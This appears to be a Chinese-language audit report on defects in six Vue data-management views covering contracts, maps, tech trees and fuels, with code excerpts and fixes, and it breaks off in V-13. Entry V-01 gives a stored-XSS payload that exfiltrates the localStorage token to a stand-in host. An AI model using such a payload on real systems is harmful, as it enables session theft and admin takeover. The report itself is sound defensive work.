# U08 frontend views data1（分支归属：master 基线）

## 概述

**审计范围（严格）**：`frontend/src/views/data-management/` 下 6 个指定文件（其余 data-management 文件与 `components/**` 未审计）。

| 文件 | 行数 | 说明 |
| --- | --- | --- |
| `ContractManageView.vue` | 1867 | 合同实例列表 / 新建（动态 inputSchema 表单）/ 详情与会签编号补全 |
| `MapsManager.vue` | 2660 | Konva 地图画布（节点拖拽、连线模式、背景图导入与变换、画布缩放平移） |
| `TechTreeManager.vue` | 638 | 科技树（ECharts tree + 自实现 DOM 平移缩放）/ 表格 |
| `ContractTypeManageView.vue` | 406 | 合同类型列表 / 启用开关 / 简单与可视化编辑器入口 |
| `FuelManager.vue` | 286 | 燃料 CRUD |
| `DataManagementView.vue` | 82 | 按 `route.meta.type` 动态派发数据管理子组件 |

**基线确认**：`git diff --stat master...feature/contract-watcher -- frontend/src/views/data-management/` 无输出 → 本 6 个文件与 master 完全一致，结论归属 master 基线。

**方法与约束**：全程 `read`/`grep` 静态阅读，**未修改任何代码**、未启动前端、未连数据库。
为判定「前端缺陷 vs 后端已兜住」，交叉读取了以下运行时依赖作为旁证（不作为独立缺陷报告）：
`api/request.ts`（响应拦截器统一弹错 + `silent` 静默读）、`api/cache.ts`（全量副本 + 分页重建）、`composables/useCompetitionReload.ts`、`realtime/useResourceChanged.ts`、`utils/deleteConfirm.ts`、`main.ts`（全局错误处理只打 console，不弹提示）、`node_modules/element-plus` 的 Button 实现（`loading` 会同时置 `disabled`，即绑定 loading 的按钮天然防双击），以及后端 `apps/common/base_crud.py`、`apps/common/pagination.py`（`MAX_PAGE_SIZE=200`、默认 `pageSize=50`）、`apps/maps/*`、`apps/tech_tree/*`、`apps/fuels/serializers.py`、`apps/contracts/views.py|engine.py|builder/builder.py`。

**缺陷统计**：P1 ×6、P2 ×6、P3 ×8，共 20 条（V-01 ~ V-20）。未发现可确证的 P0；V-01 的定级说明见该条。

**风险主线**：
1. **静默错误**（不报错但业务结果错误）：合同输入项 `default` 未打底 → 引擎取 `None` → `to_number` 变 0（V-03）；列表被静默截断为前 50/100 条，看不到也搜不到（V-04）；未填距离的路径按 0 计入路程（V-12）。
2. **跨比赛/跨账号残留状态**：`entityOptionsMap` / `mapNodes` / `techNodes` / `companyLocationCache` 均不随切比赛失效（V-05），叠加无竞态保护的 `loadData`（V-09）。
3. **画布坐标与事件解绑**：双击新建节点用屏幕坐标当世界坐标（V-06）；科技树监听器解绑目标元素写错导致累积（V-10）；平移状态可卡死（V-15）。
4. **注入与转义**：删除确认弹窗走 `dangerouslyUseHTMLString` 且名称未转义（V-01）。

---

## 缺陷清单

### [P1] V-01 删除确认弹窗把实体的「名称」拼进 HTML 且未转义 → 存储型 HTML/JS 注入（可窃取超管令牌）

- 位置：`frontend/src/views/data-management/FuelManager.vue:211`、`MapsManager.vue:1470`、`MapsManager.vue:1714`、`MapsManager.vue:1791`、`TechTreeManager.vue:544`（根因：`frontend/src/utils/deleteConfirm.ts:46`）
- 代码：

```ts
// frontend/src/utils/deleteConfirm.ts:40-48（根因）
  const msg =
    `删除「<b>${name}</b>」将<b>级联删除</b>以下关联数据，且不可恢复：<br/><br/>` +
    `${lines}<br/><br/>确定继续删除吗？`;
  await ElMessageBox.confirm(msg, "级联删除警告", {
    type: "warning",
    dangerouslyUseHTMLString: true,
    confirmButtonText: options?.confirmText || "确认级联删除",
```

```ts
// frontend/src/views/data-management/MapsManager.vue:1714-1717（调用点，name 直接来自列表行）
    await confirmDeleteWithImpact(row.name, impact, {
      baseMessage: `确定删除节点类型"${row.name}"吗？该类型下的所有地图节点及其关联边将一并删除，且不可恢复。`,
    });
    await mapsApi.nodeTypes.remove(row.id, compStore.competitionId);
```

（同类调用：`FuelManager.vue:211` `confirmDeleteWithImpact(row.name, impact, …)`、`MapsManager.vue:1470` `node.name`、`MapsManager.vue:1791` `row.name`、`TechTreeManager.vue:544` `row.name`。）

- 触发条件：
  1. 持 `data:fuel:edit` / `data:map:edit` / `data:tech:edit` 的账号（`FuelManager.vue:8`、`MapsManager.vue:243` 等按钮级权限即可，**不要求超管**）把名称设为 HTML 载荷，例如节点类型名 `<img src=x onerror=fetch('//x/'+localStorage.token)>`。后端不限制字符：`apps/maps/serializers.py:14` 与 `apps/fuels/serializers.py:13` 都只是 `CharField(max_length=128/255, trim_whitespace=True)`，仅校验非空。
  2. 之后**任何账号**（含超管）在对应列表点「删除」并确认级联删除，`ElMessageBox` 以 `v-html` 渲染该字符串，内联事件处理器即执行。
  3. 前端未做任何转义/白名单（本 6 个文件内 `v-html` 为 0 处，但此路径等价于 `v-html`）；`frontend/index.html` 无 CSP meta，`main.ts:39-55` 的全局处理器只打 console，不会拦下注入。
- 后果：低权限账号写入、高权限账号触发的**跨账号存储型 XSS**。应用令牌存于 `localStorage`（`utils/accountStorage.ts` 按账号命名空间）且请求头由拦截器自动携带（`api/request.ts:34-37`），脚本可读走令牌；因管理端还提供「服务器地址切换/上传/权限编辑」等能力，等价于超管会话完全接管。若现网确实存在持 `data:*:edit` 的非超管账号，本条应视为 P0。
- 修复建议：
  1. `deleteConfirm.ts` 改为不使用 `dangerouslyUseHTMLString`，用纯文本 + `\n` 换行；确需富文本时对 `name` 做 `escapeHtml`（`&<>"'`）。
  2. 统一改为「标题固定文案 + 明细用组件渲染」，避免任何字符串拼 HTML。
  3. 后端对名称类字段加最小字符集校验（拒绝 `<>&"'`），作为纵深防御。

### [P1] V-02 科技树前置依赖成环时仍按树渲染 → ECharts `tree` 无限递归，页面卡死

- 位置：`frontend/src/views/data-management/TechTreeManager.vue:337-357`
- 代码：

```ts
  for (const n of nodes.value) {
    const prereqs = n.prerequisites || [];
    for (const p of prereqs) {
      const child = nodeMap.get(n.id);
      const parent = nodeMap.get(p.prerequisiteNodeId);
      if (child && parent) {
        parent.children!.push(child);
        hasParent.add(n.id);
      }
    }
  }
  …
  if (roots.length === 0 && nodeMap.size > 0) {
    return { name: "科技树", children: Array.from(nodeMap.values()) };   // 兜底把「无根」的环结构整份塞进 tree
  }
```

- 触发条件：
  1. 前端只排除「自己」，不排除间接环：`TechTreeManager.vue:182` `v-for="n in nodes.filter((x) => x.id !== editId)"`。于是先编辑 A 选前置 B，再编辑 B 选前置 A（或 A→B→C→A），即形成长度为 2/3 的环。
  2. 后端也不拦：`apps/tech_tree/serializers.py:83-88` 直接 `delete()` + `create()` 写 `TechPrerequisite`，无 `pid != instance.id`、无环检测；`unique_fields` 只管名称重名。
  3. 树视图是**默认视图**（`TechTreeManager.vue:217` `viewMode = ref("tree")`），`loadData` 完成后即 `renderTree()`（`:312`）。
- 后果：环使 `hasParent` 覆盖全部节点 → `roots.length === 0` → 走兜底分支，把互相引用的对象图交给 ECharts `series.type="tree"`；其 layout 递归遍历 `children` 造成无限递归，抛 `RangeError: Maximum call stack size exceeded`（或被浏览器判定为死循环）→ 科技树页面空白/卡死，且因为数据已落库，**该比赛的科技树页面对所有人都会持续打不开**，只能靠接口改数据恢复；表格模式与后端接口不受影响（仍在 v-show 的 DOM 内），但默认视图直接崩。
- 修复建议：
  1. 渲染前做环检测（DFS 三色标记或 Kahn 拓扑排序）：检测到环时降级为「平铺列表 + 明确提示哪些节点互相依赖」，不要构造环状 `children`。
  2. 前端保存前置依赖时即校验：不允许选择「以当前节点为前置（含传递）」的节点（用现有 `nodes` 的 prerequisites 做可达性判断）。
  3. 后端在 create/update 写入 `TechPrerequisite` 前做环检测并返回 400（权威兜底）。

### [P1] V-03 新建合同只对 nodeRoute/list/dict 套用 `inputSchema.default`，number 等标量默认值被丢弃 → 引擎静默按 0 计算

- 位置：`frontend/src/views/data-management/ContractManageView.vue:1318-1346`
- 代码：

```ts
function onTypeChange() {
  createForm.parties = {};
  createForm.inputs = {};
  inputSchemaFields.value.forEach((f: any) => {
    if (f.type === "ENTITY") loadEntityOptions(f.entityType);
    else if (f.type === "nodeRoute") {
      loadMapNodes();
      createForm.inputs[f.key] = Array.isArray(f.default) ? f.default : [];
    }     else if (f.type === "mapNode") {
      loadMapNodes();
    }     else if (f.type === "list")
      createForm.inputs[f.key] = Array.isArray(f.default) ? f.default : [];
    else if (f.type === "dict")
      createForm.inputs[f.key] =
        f.default && typeof f.default === "object" && !Array.isArray(f.default) ? f.default : {};
```

（`number` / `string` / `boolean` / `techNode` / `ENTITY` 分支均未写 `createForm.inputs[f.key] = f.default`。）

- 触发条件：
  1. 合同类型的输入项带默认值（可视化编辑器可设：`components/contracts/ContractTypeGraphEditor.vue:267` 的「默认值」输入框 `<el-input v-else v-model="selectedNode.data.default" />`，由 `contracts/graph-model.ts:1518` 写入 `inputSchema`；另有必填开关 `ContractTypeGraphEditor.vue:253`），例如 `amount`（成交金额/费率）`default = 100`。
  2. 用户打开「新建合同」选类型后不手动填该数字框（`BigNumberInput :min="0"` 此时为空）→ `createForm.inputs[key] === undefined` → `handleCreate` 里 `inputsToSubmit[f.key] = undefined`（`:1451`）→ `JSON.stringify` 直接丢弃该键。
  3. 引擎不会补默认值：`backend/apps/contracts/builder/builder.py:917-927` 明确写着「引擎的 `execute` **不会**自动套用 `default`……默认值是在**创建合同**那一步由调用方填进 `inputs` 的（前端表单如此）」，并指出缺失时会「经 `to_number` 变成 **0**」；表单路径无二次兜底（只有试算接口 `views.py:503-507` 打底）。
- 后果：类型作者声明的默认值被静默忽略；`amount` 等参与乘/加的效果一律按 0 落账，合同仍能置为 `EXECUTED`，页面只在详情里事后给出「本次执行未对任何产业字段产生实际变化」的提示。即「按 0 成交」的静默错误账目，人工很难发现（与后端 U05 的「静默取 0」主线同源，但触发点在创建表单）。
- 修复建议：
  1. `onTypeChange` 统一先铺默认值再按类型覆盖：`if (f.default !== undefined) createForm.inputs[f.key] = f.default;` 之后再走各类型的特殊初始化（`{}`/`[]` 覆盖仅限清单类）。
  2. `handleCreate` 提交前对 `undefined` 的输入项回填 `f.default`，并在无默认值且 `required` 时报错拦截（见 V-11）。
  3. 后端创建合同时按 `builder.default_inputs()` 的语义补默认值（真正的单一真源），前端仅作展示。

### [P1] V-04 列表请求未传 `pageSize`，被缓存层的分页重建切片为前 50/100 条 → 数据看不到、搜不到、执行不到

- 位置：`frontend/src/views/data-management/ContractManageView.vue:1274`、`TechTreeManager.vue:307`、`FuelManager.vue:165`、`ContractTypeManageView.vue:254`
- 代码：

```ts
// ContractManageView.vue:1274（无 page/pageSize；后端返回分页对象）
const res = await contractsApi.list({ competitionId: compStore.competitionId });
contracts.value = Array.isArray(res) ? res : res.items || [];
```

```ts
// TechTreeManager.vue:307-310（整个科技树只渲染这 50 条）
const res = await api.get("/tech-nodes", {
  params: { competitionId: compStore.competitionId },
});
nodes.value = res?.items || res || [];
```

（`FuelManager.vue:165-170` 显式 `pageSize: 100`；`ContractTypeManageView.vue:254` `contractTypesApi.list(false)` 无分页参数。）

- 触发条件：
  1. 后端这些接口都返回 `{items,total,page,pageSize}`（`apps/common/base_crud.py:130-133`、`apps/contracts/views.py:198-202`），`parse_pagination` 默认 `pageSize = 50`（`apps/common/pagination.py:11`）。
  2. 前端 GET 走本地全量副本层，全量同步后按**请求参数**还原分页切片：`api/request.ts:336-343` `reconstruct()` 在 `params.pageSize == null` 时取 `pageSize = 50`，返回 `items.slice(0, 50)`；随后 `normalizeListResponse` 把 `items` 拆成裸数组（`api/request.ts:312-324`），于是 `total` 在前端根本不存在。
  3. 触发数据量：某比赛合同数 > 50（多公司多次会签很容易超过）、科技节点 > 50、燃料 > 100、合同类型 > 50。
- 后果：
  - 合同列表**只显示最新 50 条**（后端按 `-created_at` 排序，`views.py:200`），更早的合同既看不到也搜不到（`filteredContracts` 只在已加载数组里过滤，`:1143-1151`），无法补编号、无法执行；顶部「暂无草稿合同可执行」提示（`:21`、`:1158`）与执行按钮状态也在残集上计算。删除/执行等按 id 操作虽有后端兜底，但用户界面上这些合同等于不存在。
  - 科技树默认视图只由最新更新的 50 个节点构成，树形结构缺枝少叶；「前置依赖」下拉（`:180-187`）也只有这 50 个，无法给老节点配前置。
  - 燃料 > 100 条时同理；且四处都没有分页控件、没有总数提示，用户无从判断数据被截断。
- 修复建议：
  1. 这四个列表显式请求足够大的 `pageSize`（当前后端硬上限 200，> 200 需翻页循环），或按项目既有做法（`mapsApi.nodes.list(page,200,…)` 的 while 循环、`loadEntityOptions` 的 `pageSize:500`）循环取全。
  2. 或改为真正的服务端分页（分页器 + `normalize:false` 读取 `total`），至少让用户能看到「共 N 条」。
  3. 缓存层建议对未显式传 `pageSize` 的读取返回全量（或在 `reconstruct` 里区分「调用方是否分页」），避免这种静默切片。

### [P1] V-05 新建合同引用的实体下拉缓存不随切换比赛失效 → 展示并提交上一比赛的实体

- 位置：`frontend/src/views/data-management/ContractManageView.vue:806-829`（缓存）与 `:1620-1633`（切比赛只清了 4 个 ref）
- 代码：

```ts
// ContractManageView.vue:806-829
const entityOptionsMap = reactive<Record<string, any[]>>({});
const entityLoading = reactive<Record<string, boolean>>({});

async function loadEntityOptions(entityType: string) {
  if (!entityType || entityOptionsMap[entityType] || entityLoading[entityType]) return;   // 只按 entityType 判缓存，不含 competitionId
  …
    entityOptionsMap[entityType] = list;
```

```ts
// ContractManageView.vue:1620-1632（切比赛时清空的只有这 4 项）
useCompetitionReload(
  () => { … loadContracts(); },
  () => {
    contracts.value = [];
    contractTypes.value = [];
    companies.value = [];
    industryTypes.value = [];
  },
);
```

- 触发条件：同一会话内切换比赛（视图不卸载，`DataManagementView` 动态组件保持挂载）。仓库里被跨比赛复用且未清理的还有：`entityOptionsMap`（原料/零件/产品/基建/燃料/载具/仓库）、`mapNodes`+`mapEdges`（`routeFullyLinked`/`addableMapNodes` 用它校验连线）、`techNodes`、`companyLocationCache`（影响原料按所在地过滤 `materialOptionsForField`）。
- 后果：切到比赛 B 后打开「新建合同」，`原料清单/基建清单/载具清单/科技节点/地图节点` 下拉仍是比赛 A 的数据（`loadEntityOptions` 因缓存命中直接 return，`loadMapNodes` 因 `mapNodes.value.length` 非 0 直接 return），用户无法选中 B 的实体，却能选中 A 的实体并提交；提交的 `inputs` 里存的是 A 的实体名/id，引擎按当前比赛解析（如 `engine.py:1442` 按 `competition_id + name` 查科技节点）会取不到 → 效果静默为 0。`nodeRoute` 的相邻连线校验用 A 的边表，可以放行 B 中实际不存在连线的路径。刷新页面才恢复。
- 修复建议：
  1. `useCompetitionReload` 的 `clear` 回调中一并清空 `entityOptionsMap`（`Object.keys(...).forEach(k => delete ...)`）、`mapNodes/mapEdges/techNodes`、`companyLocationCache`。
  2. 缓存键加入 `competitionId`（如 `${competitionId}:${entityType}`），从根上避免复用。
  3. 大方向：把这几类「按比赛加载的字典」收敛到 `useCompetitionReload` 统一管理的 composable。

### [P1] V-06 双击空白/右键新建节点把「屏幕坐标」当世界坐标提交 → 缩放或平移后节点落点错误

- 位置：`frontend/src/views/data-management/MapsManager.vue:1264-1269`、`1303-1310`、`1565-1576`、`1595-1596`
- 代码：

```ts
function getCanvasPos(_e: any) {
  const stage = stageRef.value?.getStage();
  if (!stage) return { x: 0, y: 0 };
  const pos = stage.getPointerPosition();      // 相对画布容器的屏幕坐标，未除以 scale、未减 stage.x/y
  return { x: pos?.x || 0, y: pos?.y || 0 };
}
function handleStageDblClick(e: any) {
  if (!canEdit.value) return;
  if (e.target !== e.target.getStage()) return;
  const pos = getCanvasPos(e);
  pendingCreatePos.value = { x: pos.x, y: pos.y };   // 直接当作世界坐标
```

```ts
// MapsManager.vue:1590-1597（提交）
      await mapsApi.nodes.create({
        competitionId: compStore.competitionId,
        name: createForm.name,
        region: createForm.region || "",
        nodeTypeId: createForm.nodeTypeId,
        x: pendingCreatePos.value.x,
        y: pendingCreatePos.value.y,
      });
```

（右键路径同样如此：`handleStageContextMenu` `:1353-1358` 把 `getCanvasPos` 的结果存进 `contextMenu.data`，`openCreateAtContext` `:1571-1574` 直接取用。）

- 触发条件：先在画布上滚轮缩放（`handleStageWheel` 允许 0.2~5 倍）或按住空白平移（`handleStageMouseMove` 直接 `stage.x()/y()`），再双击空白（或右键→「在此新建节点」）创建节点。注意 `fitCanvas()`（`:1611`，工具栏默认可见）自己就会把 `stageScale` 设成非 1 的值，因此「点一下适应画布再双击」是最短复现路径。
- 后果：节点被创建在错误位置——偏差 = `pointer/scale - stage.offset`。缩放到 0.5 倍时实际落点是点击点的 2 倍远，平移后偏差更大；常见现象是提示「节点已创建」但当前视口里看不到新节点（跑到画布视野外），用户以为创建失败而重复创建，节点列表/坐标被污染。同文件 `handleStageWheel:1322-1325` 已经写了正确的换算（`(pointer.x - stage.x()) / oldScale`），说明此处是遗漏而非有意。
- 修复建议：
  1. 新增 `getWorldPos()`：`const p = stage.getPointerPosition(); return { x: (p.x - stage.x())/stage.scaleX(), y: (p.y - stage.y())/stage.scaleY() }`（或用 Konva 的 `stage.getRelativePointerPosition()`），双击与右键新建都改用它。
  2. 创建成功后把新节点滚入视野（聚焦/居中），便于用户确认。

### [P2] V-07 产业字段字典未就绪即参与「不支持该合同」判定 → 误报并硬阻断合同创建

- 位置：`frontend/src/views/data-management/ContractManageView.vue:748-771`（配套 `:1600-1603`、`:1405`、`:1611-1617`）
- 代码：

```ts
const missingEffectFields = computed(() => {
  const out: { party: string; fieldKey: string; companyName: string; fieldName: string }[] = [];
  for (const ref of effectFieldRefs.value) {
    if (!ref.party || !ref.fieldKey) continue;
    const companyId = (createForm.parties as Record<string, number>)[ref.party];
    if (companyId == null) continue;
    const industryTypeId = companyIndustryMap.value[companyId];
    const set = industryTypeId != null ? industryFieldKeyMap.value.get(industryTypeId) : undefined;
    if (!set || !set.has(ref.fieldKey)) {      // industryTypes 为空 → set 恒为 undefined → 一律判「缺失」
      out.push({ … });
```

```ts
watch(
  () => createForm.parties,
  () => { showUnsupported.value = missingEffectFields.value.length > 0; },   // 一选公司就弹「该产业不支持该合同」
  { deep: true },
);
```

- 触发条件（任一）：
  1. `industryTypes` 尚未返回：`openCreate()` `:1405` 只是 `loadIndustryTypes()`（fire-and-forget，`:1309-1316` catch 仅 `console.error`），紧接着用户选类型、选公司触发上面的 watch。
  2. 账号无 `industryType:view`：`:1602` `if (authStore.can("industryType:view")) loadIndustryTypes();` → `industryTypes` 永远为空。
  3. `/industry-types` 读请求失败（缓存层静默降级后无本地副本时 reject，`api/request.ts:659-666`）→ 静默 console。
  契约：`industryFieldKeyMap`（`:705-713`）完全由 `industryTypes.value` 构建。
- 后果：只要合同类型里存在任一「产业字段效果」（`effectFieldRefs` 非空），上述任一情形下**每个已选公司的参与方都会被判为缺失字段**，一选公司即弹出「该产业不支持该合同」错误窗（`:1611-1617` 自动打开），并且 `handleCreate` 在 `:1422-1425` 直接 `return` → 合同**无法创建**，错误提示却把原因归咎于公司产业，管理员会去改产业字段配置，白查很久。同文件 `isFieldVisible` 在无法判定时是「fail-open 显示」（`:780-790` 注释明说），此处判定口径与之相反，属于不一致。
- 修复建议：
  1. 增加「字典未就绪」状态：`const industryReady = ref(false)`，`loadIndustryTypes()` 成功/失败都置位；未就绪时 `missingEffectFields` 直接返回 `[]`（fail-open），并且 `handleCreate` 在未就绪时改为 `await loadIndustryTypes()` 后再判定或用 `ElMessage.warning("产业字段加载中，请稍后重试")`。
  2. 选公司时若不满足权限 `industryType:view`，应提示「缺少产业类型查看权限，无法校验合同适用性」，而不是静默判缺失。
  3. 该判定宜移到提交时（一次性请求 + 后端校验），不要用 watch 主动弹窗。

### [P2] V-08 拖动节点后点「保存」会用属性面板里的旧坐标覆盖 → 位置回退

- 位置：`frontend/src/views/data-management/MapsManager.vue:914-922`（配合 `:1411-1416`、`:1480-1492`）
- 代码：

```ts
watch(selectedNode, (n) => {          // 仅在「选中对象变化」时同步表单，非 deep
  if (n) {
    nodeForm.name = n.name;
    nodeForm.region = n.region;
    nodeForm.nodeTypeId = n.nodeTypeId;
    nodeForm.x = n.x;
    nodeForm.y = n.y;
  }
});

function handleNodeDragMove(node: MapNode) {      // 拖拽中直接改对象属性，不触发上面的 watcher
  const grp = stageRef.value?.getStage()?.findOne(`#node-${node.id}`);
  if (!grp) return;
  node.x = grp.x();
  node.y = grp.y();
}
```

```ts
async function saveNode() {
  const node = selectedNode.value;
  if (!node) return;
  savingNode.value = true;
  try {
    await mapsApi.nodes.update(node.id, {
      competitionId: compStore.competitionId,
      name: nodeForm.name,
      region: nodeForm.region,
      nodeTypeId: nodeForm.nodeTypeId,
      x: nodeForm.x,        // 拖拽前的旧值
      y: nodeForm.y,
    });
```

- 触发条件：选中节点 → 把节点拖到新位置（拖拽结束已 PATCH 成功）→ 接着改名称/类型后点「保存」（或仅点「保存」）。此时 `nodeForm.x/y` 仍是选中时的旧坐标。
- 后果：保存把节点位置写回拖拽前的位置并 `loadData()` 刷新，节点「自己跳回去」，用户刚做的布局调整被静默撤销；若同时改了名称，会看到「名称已更新」的成功提示，更易误判为拖拽失败。多次拖拽 + 保存会反复回退。
- 修复建议：
  1. `handleNodeDragEnd` 成功后同步 `nodeForm.x/nodeForm.y`（`nodeForm.x = x; nodeForm.y = y;`）。
  2. 或把 `watch(selectedNode, …, { deep: true })` 只在「表单未被用户修改」时回填，或干脆在 `saveNode` 里对 x/y 取 `node.x/node.y`（区分「表单编辑的坐标」与「拖拽产生的坐标」，例如给拖拽加一个 `dirtyPos` 标记）。

### [P2] V-09 列表加载无请求令牌/竞态保护：旧响应可覆盖新数据（切比赛、实时事件、保存后并发 reload）

- 位置：`frontend/src/views/data-management/MapsManager.vue:1232-1261`、`ContractManageView.vue:1267-1281`、`TechTreeManager.vue:300-318`、`FuelManager.vue:158-176`
- 代码：

```ts
// MapsManager.vue:1232-1254
async function loadData() {
  loading.value = true;
  try {
    if (!compStore.competitionId) { … return; }
    const res: any = await mapsApi.full({ competitionId: compStore.competitionId });
    if (res) {
      nodes.value = res.nodes || [];        // 无「本次请求是否仍是最新」的校验
      edges.value = res.edges || [];
```

```ts
// ContractManageView.vue:1267-1280
async function loadContracts() {
  if (!compStore.competitionId) { contracts.value = []; return; }
  loading.value = true;
  try {
    const res = await contractsApi.list({ competitionId: compStore.competitionId });
    contracts.value = Array.isArray(res) ? res : res.items || [];
  } catch (e) { console.error(e); }
  finally { loading.value = false; }        // 后到的旧请求还会把 loading 复位
}
```

- 触发条件：同一视图存在多条并发触发路径——`onMounted`、`useCompetitionReload`（切比赛）、`useResourceChanged(...)`（任何账号的增删改广播，含本端自己保存后的广播）、工具栏「刷新数据」、各保存/删除成功后的显式 `loadData()`。典型时序：比赛 A 的 `loadData` 还在路上 → 切到比赛 B 又发一次 → A 的响应后到并写入 `nodes/contracts`（缓存层按 `competitionId` 分键，不会去重，`api/request.ts:258-261`）。
- 后果：界面停留在另一个比赛的数据上（P1 性质的错配在 V-05 已单列），此处叠加表现为：列表内容与顶部比赛名/后续写操作不匹配；`loading` 提前复位导致表格显示旧行；地图页在错配状态下继续拖拽/编辑会以当前 `competitionId` 去 PATCH 另一比赛的节点（后端对非超管会 404，超管则真的改动对方比赛的地图坐标，`apps/common/base_crud.py:78-82` + `apps/maps/serializers.py:134-146`）。`useResourceChanged` 与显式 `load()` 并存还使每次保存至少触发 2 次列表请求，放大竞态窗口。
- 修复建议：
  1. 引入请求序号守卫：`let seq = 0; const my = ++seq; … if (my !== seq) return;` 之后才写 ref（或改用 `AbortController` + 缓存层已支持的 `config.signal`，见 `api/request.ts:265`）。
  2. `loading` 同理只在最新请求里复位；切比赛时让旧请求失效（可以 `const cid = compStore.competitionId` 快照，回填前断言 `cid === compStore.competitionId`）。
  3. 去掉「保存成功后显式 `load()` + 广播再 `load()`」的重复拉取（二选一）。

### [P2] V-10 科技树缩放/平移监听器解绑用错 DOM 元素 → 监听器累积，刷新后滚轮缩放跳变

- 位置：`frontend/src/views/data-management/TechTreeManager.vue:265-273`（解绑）对照 `:411`、`:428`、`:467`（绑定）
- 代码：

```ts
// 绑定：renderTree() 里 wrap = chartRef（.tt-chart）
  const wrap = chartRef.value!;                       // :411
  wrap.addEventListener("mousedown", mouseDownHandler);   // :428
  wrap.addEventListener("wheel", wheelHandler, { passive: false });   // :467
```

```ts
// 解绑：onBeforeUnmount / 每次 renderTree 开头用的是 panWrapRef（.tt-pan-wrap）
  const wrap = panWrapRef.value;                      // :265 ← 元素不一致
  if (mouseDownHandler && wrap) {
    wrap.removeEventListener("mousedown", mouseDownHandler);
    mouseDownHandler = null;
  }
  if (wheelHandler && wrap) {
    wrap.removeEventListener("wheel", wheelHandler);
    wheelHandler = null;
  }
```

（模板：`panWrapRef` 是外层 `.tt-pan-wrap`，`chartRef` 是内层 `.tt-chart`；`renderTree` 每次都会 `chart.dispose()` + 重新 `echarts.init` 但**复用同一个 `.tt-chart` div**。）

- 触发条件：`renderTree()` 在一次会话中被多次调用——`loadData()` 成功后（`:312`，含切比赛、`useResourceChanged("tech-nodes")` 即自己保存/删除后、任何他人改动）、以及切换视图模式（`:289-298`）。每次调用都往同一个 `.tt-chart` 上再挂一份 `wheel`/`mousedown` 监听（旧的那份因为解绑目标写错而残留）。
- 后果：多个 `wheelHandler` 闭包各自持有**独立的** `s/ox/oy`（每次 `renderTree` 都重置 `s=1, ox=oy=0`）。用户在缩放/平移后再触发一次数据刷新，下一个滚轮事件会被「旧 handler（保留当前 s）」和「新 handler（s=1）」依次处理，最后写入 `wrap.style.transform` 的是新 handler → **缩放比例与平移突然跳回接近初始状态**，表现为「缩放不跟手/一跳回原点」；同时旧的 `wheel` 监听永不释放，随刷新次数线性增长（内存与事件开销泄漏）。`mousedown` 监听同样泄漏（其 `panning/panStart` 已无人读取，影响较小）。
- 修复建议：
  1. 统一持有被绑定的元素：在 `renderTree` 里把 `wrap` 存入模块级 `chartEl` 变量，解绑时用它（或直接改为在 Vue 模板上 `@wheel`/`@mousedown` 声明式绑定，随组件销毁自动清理）。
  2. 用 `onBeforeUnmount` 里保存的同一元素引用；`chart.dispose()` 之外补 `chart.off("click")`（`:403` 已 off 一次，但重复 `init` 需要每次重新 `on`，当前写法可保留）。

### [P2] V-11 合同「必填输入项」只有视觉标记、无任何校验（后端也不校验）→ 空参数合同照样创建/执行，效果按 0

- 位置：`frontend/src/views/data-management/ContractManageView.vue:184-189`、`:1409-1459`
- 代码：

```vue
          <el-form-item
            v-for="field in visibleInputSchemaFields"
            :key="field.key"
            :label="field.label"
            :required="field.required"
            :label-position="field.type === 'materialList' || … ? 'top' : undefined"
          >
```

```ts
async function handleCreate() {
  if (!createForm.contractTypeId) { ElMessage.warning("请选择合同类型"); return; }
  // 仅校验每方都选定了公司；合同编号允许留空（分步补全：发起方填自己那方，其余待补）
  for (const p of partyRolesSelectable.value) {
    if (!createForm.parties[p.role]) { ElMessage.warning(`请为「${p.label}」选择公司`); return; }
  }
```

（整个新建表单是 `<el-form label-width="130px">`，**没有 `ref`/`:model`/`:rules`，也没有 `validate()` 调用**；`:1450-1452` 只在可见字段里逐个 `inputsToSubmit[f.key] = createForm.inputs[f.key]`。）

- 触发条件：合同类型的任一 `inputSchema` 项带 `required: true`（可视化编辑器 `ContractTypeGraphEditor.vue:253` 的必填开关 → `graph-model.ts` 写入 `inputSchema`），用户不填该输入项直接点「确定创建」。
- 后果：`el-form-item` 的 `required` 只渲染星号，不做任何校验，空值（`undefined`）随请求发出；后端 `apps/contracts/views.py:218-226` 的 `ContractSerializer.is_valid` 也不校验 `inputSchema.required`（只有试算接口打底默认值），因此「必填参数为空」的合同被成功创建；执行时缺失项被引擎按 0/空处理（`builder.py:920-927`），业务上表现为乘以 0 的静默无效落账，而页面只提示「合同已创建（草稿）」。必填约束在前后端同时落空，属于契约形同虚设。
- 修复建议：
  1. 表单改用 `ref` + `:model` + 动态 `rules`（对 `field.required`、`number` 的 `min/max/precision`、清单类的非空与数量 > 0 生成规则），提交前 `await formRef.value.validate()`。
  2. `handleCreate` 增加一次显式兜底：遍历可见字段，`required && (value == null || value === "")` → 提示并定位到该项。
  3. 后端补 `inputSchema.required` 校验（权威），前端仅做体验优化。

### [P2] V-12 路径距离允许 0，而 0 又被当作「未填写」不显示 → 未填距离的边静默按 0 参与路程计费

- 位置：`frontend/src/views/data-management/MapsManager.vue:1172-1174`、`:277-283`、`:732-739`
- 代码：

```ts
// 仅在有距离值的边上显示距离标签，避免未填写的 0 距离污染画布
const edgesWithDistance = computed(() =>
  edges.value.filter((e) => typeof e.distance === "number" && e.distance > 0),
);
```

```vue
            <el-form-item label="距离">
              <el-input-number
                v-model="edgeForm.distance"
                :min="0"
                :precision="0"
                :controls="false"
                style="width: 100%"
              />
```

（连线对话框 `:732-739` 同样 `:min="0"`，默认 `distance: 0`；前端无「必须 > 0」校验。后端 `apps/maps/serializers.py:153` `distance = FloatField(default=0)` 亦无下限。）

- 触发条件：连线模式创建路径时不填距离直接确定（默认 0），或在路径属性里把距离清成 0 保存 → 该边落库 `distance = 0`。地图上**看不到**它的距离标签（上面的过滤器把 0 当未填写），管理员无法定位哪些边缺距离。
- 后果：`compute_route_distance`（`apps/contracts/engine.py:1466-1481`）对相邻节点求最短路并按边距离累加，0 距离边等价于「免费传送」；任何以「路程距离 × 费率」计价的合同会得到偏小甚至 0 的金额，且因为合同值恒为 0 时页面只给「未产生实际变化」的弱提示，问题会被归咎到合同配置而不是地图数据。
- 修复建议：
  1. 创建/保存路径时校验 `distance > 0`（或明确允许 0 但在地图上以「未设置」样式显著标出，二选一，保持一致）。
  2. 路径类型/边的列表视图中增加「距离未填写」的过滤与计数，便于批量补齐。
  3. 若 0 表示「未填写」是设计意图，引擎侧对 0 距离边应报错或跳过而非按 0 累加。

### [P3] V-13 取消删除确认时 Promise 拒绝未捕获（unhandledrejection 噪声）

- 位置：`frontend/src/views/data-management/ContractTypeManageView.vue:321-334`、`ContractManageView.vue:1572-1587`
- 代码：

```ts
